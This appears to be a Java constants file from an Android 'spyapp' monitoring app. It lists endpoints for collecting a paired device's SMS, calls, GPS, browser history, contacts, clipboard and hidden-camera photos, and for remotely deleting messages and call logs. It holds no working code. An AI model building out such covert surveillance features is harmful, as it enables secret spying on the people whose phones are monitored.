package com.hinj.app.utils;

/**
 * Name :- Hiteshm Date :- 06/11/2014 Purpose :- Purpose of uUtility class is to
 * declare global constants in whole project
 * */

public class HingAppConstants {

	public static final String EMPTY_STRING = "";

	public static String HINJ_APP_SHARED_PREFERENCE = "HINJ_APP_SHARED_PREFERENCE";

	public static String FILE_UPLOAD_IMAGE_CONSTANT = "1";
	public static String FILE_UPLOAD_AUDIO_CONSTANT = "3";
	public static String FILE_UPLOAD_VIDEO_CONSTANT = "2";
	public static String FILE_UPLOAD_APK_CONSTANT = "4";
	public static String FILE_UPLOAD_OTHER_CONSTANT = "5";
	//	 image =1, audio = 3, video= 2, apk - 4, others - 5
	
	public static String FACEBOOK_ID_KEY = "FACEBOOK_ID_KEY";
	public static String RA_ID_KEY = "RA_ID_KEY";
	public static String LOGIN_DEVICE_ID_KEY = "LoginDeviceId";
	
	public static String LAST_NAME_KEY = "LAST_NAME_KEY";
	public static String FIRST_NAME_KEY = "FIRST_NAME_KEY";
	public static String EMAIL_ID_KEY = "EMAIL_ID_KEY";
	public static String PASSWORD_KEY = "PASSWORD_KEY";
	public static String IMAGE_URL_KEY = "IMAGE_URL_KEY";
	
	public static String PREFERENCE_URL_KEY = "PREFERENCE_URL_KEY";
	public static String USER_NAME_KEY = "USER_NAME_KEY";
	public static String VOICE_RETENTION_KEY = "VOICE_RETENTION_KEY";
	public static String AUTO_LOGIN_KEY = "AUTO_LOGIN_KEY";
	public static String UPLOAD_DEVICE_ID_KEY = "UPLOAD_DEVICE_ID_KEY";
	
	public static String PREFERENCE_DATE_SAVE_KEY = "PREFERENCE_DATE_SAVE_KEY";
	public static String ChildDevicedModel_KEY = "ChildDevicedModel_KEY";
	
	public static String CHILD_RA_ID_KEY = "CHILD_RA_ID_KEY";
	public static String CHILD_UPLOAD_DEVICE_ID_KEY = "CHILD_UPLOAD_DEVICE_ID_KEY";
	public static String RENAME_URL = "rename_file";
	
	public static String PHOTO_COUNT_KEY = "PHOTO_COUNT_KEY";
	public static String MUSIC_COUNT_KEY = "MUSIC_COUNT_KEY";
	public static String VIDEO_COUNT_KEY = "VIDEO_COUNT_KEY";
	public static String APPS_COUNT_KEY = "APPS_COUNT_KEY";
	public static String CONTACTS_COUNT_KEY = "CONTACTS_COUNT_KEY";
	public static String MESSAGES_COUNT_KEY = "MESSAGES_COUNT_KEY";
	public static String PARENT_MODEL_NAME_KEY = "PARENT_MODEL_NAME_KEY";
	public static String PARENT_DEVICE_ID_KEY = "PARENT_DEVICE_ID_KEY";
	public static String MESSAGE_CHAT_RECIPIENT_NUMBER_NAME_KEY = "MESSAGE_CHAT_RECIPIENT_NUMBER_NAME_KEY";
	public static String CALL_RECIPIENT_NUMBER_NAME_KEY = "CALL_RECIPIENT_NUMBER_NAME_KEY";
	
	public static String KEEP_SCREEN_AWAKE = "KEEP_SCREEN_AWAKE";
	public static String NOTIFICATION_ON_OFF = "NOTIFICATION_ON_OFF";
	public static String NOTIFICATION_SOUND = "NOTIFICATION_SOUND";
	
	public static String LOGOUT_KEY = "LOGOUT_KEY";
	public static String DEVICE_ID_KEY = "DEVICE_ID_KEY";
	public static String REGISTER_DEVICE_ID_KEY = "REGISTER_DEVICE_ID_KEY";
	public static String CHILD_REGISTER_DEVICE_ID_KEY = "CHILD_REGISTER_DEVICE_ID_KEY";
	
	public static String URL_KRY = "URL_KRY";
	
	public static String CALL_LOG_DELETE_ID = "CALL_LOG_DELETE_ID";
	public static String SMS_DELETE_ID = "SMS_DELETE_ID";
	
	public static String APP_DOWNLOAD_LINK = "APP_DOWNLOAD_LINK";
	public static String DOWNLOAD_APP_NAME = "DOWNLOAD_APP_NAME";
	
	public static String CLIPBOARD_KEY = "CLIPBOARD_KEY";
	
	public static String CURRENT_FRAGMENT="SCHEDULE";
	
	public static int DISPLAY_WIDTH = 0;
	public static int DISPLAY_HEIGHT = 0;

	public static double CURRENT_LATITUDE = 0.0;
	public static double CURRENT_LONGITUDE = 0.0;
	public static double CURRENT_EVELATION = 0.0;

	public static String EMAIL_PATTERN = "^[_A-Za-z0-9-\\+]+(\\.[_A-Za-z0-9-]+)*@[A-Za-z0-9-]+(\\.[A-Za-z0-9]+)*(\\.[A-Za-z]{2,})$";

	String SURE_TO_LOGOUT_KEY = "SURE_TO_LOGOUT_KEY";

	String YES_KEY = "YES_KEY";

	String NO_KEY = "NO_KEY";

	public static String OK_KEY = "OK_KEY";

	public static final int MILLISECONDS_PER_SECOND = 1000;

	// The update interval
	public static final int UPDATE_INTERVAL_IN_SECONDS = 5;

	// A fast interval ceiling
	public static final int FAST_CEILING_IN_SECONDS = 1;

	// Update interval in milliseconds
	public static final long UPDATE_INTERVAL_IN_MILLISECONDS = MILLISECONDS_PER_SECOND
			* UPDATE_INTERVAL_IN_SECONDS;

	// A fast ceiling of update intervals, used when the app is visible
	public static final long FAST_INTERVAL_CEILING_IN_MILLISECONDS = MILLISECONDS_PER_SECOND
			* FAST_CEILING_IN_SECONDS;
	
	public static float CurrentStatus = 0;
	
	public static String URL = "http://192.168.1.69/spyapp/webservices/";
	public static String URL_67 = "http://67.205.96.105:8080/spyapp/webservices/";
	
	public static String REGISTER_URL = "signup";
	public static String FACEBOOK_SIGN_IN_URL = "facebook_signup";
	public static String GOOHGLE_SIGN_IN_URL = "google_signup";
	public static String TWITTER_SIGN_IN_URL = "twitter_signup";
	public static String LOGIN_URL = "login";
	public static String FORGOT_PASSWORD_URL = "forgot_password";
	public static String POST_QR_CODE_SCAN_RESULT_URL = "user_data_detail";
	public static String POST_QR_CODE_SCAN_RESULT_URL_WITHOUT_SCAN = "all_data_detail";
	public static String LOGOUT_URL = "logout";
	public static String PUSH_NOTE_URL = "send_push_note";
	
	public static String GET_CONFIRMATION_URL = "get_connection_confirm";
	
	public static String SMS_URL = "user_sms";
	public static String SMS_DETAIL_URL = "user_sms_detail";
	public static String CALL_URL = "user_call";
	public static String CALL_DETAIL_URL = "user_call_detail";
	
	public static String INSTALL_APPS_DETAIL_URL = "user_install_apps";
	public static String GPS_DETAIL_URL = "user_gps";
	public static String BROWSWER_DETAIL_URL = "user_browser_history";
	public static String CONTACTS_DETAIL_URL = "user_contacts";
	public static String MEDIA_DETAIL_URL = "get_album_names"; // type=1 for image,2 for video,3 for audio
	public static String MEDIA_DETAIL_LIST_URL = "get_media_by_album_names";
	public static String GET_HIDDEN_CAMERA_PHOTO_URL = "get_hidden_camera_files";
	
	public static String ACCOUNT_URL = "account"; 
	public static String CONTACT_DELETE_SINGLE = "delete_single"; 
	public static String CONTACT_DELETE_MULTIPUL = "delete_multiple"; 
	
	public static String DELETE_SINGLE_FOLDER = "delete_single_folder";
	public static String DELETE_MULTIPUL_FOLDER = "delete_multiple_folder";
	
	public static String DELETE_SMS_URL = "delete_sms";
	public static String DELETE_CALL_LOG_URL = "delete_call";
	public static String GET_DELETE_CALL_LOG_ID_URL = "get_call_id";
	public static String GET_SMS_CALL_ID_URL = "get_sms_id";
	public static String CONTACT_UPDATE = "edit_contact";
	
	public static String GET_CLIPBOARD_TEXT = "get_clipboard_text";
	public static String SET_CLIPBOARD_TEXT = "user_clipboard";
	
	public static String USER_STORAGE = "user_storage";
	public static String GET_USER_STORAGE = "get_user_storage";
	
	public static String DELETE_SINGLE_SMS = "delete_single_sms";
	public static String GET_PROPERTIES_URL = "get_file_poperties";
	
	public static String SET_CAMERA_CAPTURE = "set_camera_capture"; 
	public static String GET_CAMERA_CAPTURE = "get_camera_capture"; 
	
	public static String GET_DEVICE_FILES = "get_device_files"; 
	
	public static String SET_APP_UPLOAD = "set_app_upload"; 
	public static String GET_APP_UPLOAD = "get_app_upload"; 
	
	public static String SET_URL = "set_url"; 
	public static String GET_URL = "get_url"; 
	
}
